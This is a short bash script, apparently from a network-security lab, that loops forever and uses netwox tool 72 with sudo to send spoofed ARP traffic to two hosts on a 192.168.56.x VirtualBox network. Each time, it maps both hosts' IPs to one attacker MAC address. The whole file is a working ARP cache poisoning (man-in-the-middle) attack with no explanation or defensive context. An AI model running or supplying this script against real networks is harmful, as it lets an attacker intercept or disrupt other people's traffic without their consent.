#!/bin/bash

while true
do
	sudo netwox 72 -i 192.168.56.102 -E 08:00:27:a0:de:87 -I 192.168.56.101 -d eth14
	sudo netwox 72 -i 192.168.56.101 -E 08:00:27:a0:de:87 -I 192.168.56.102 -d eth14
	sleep 1
done
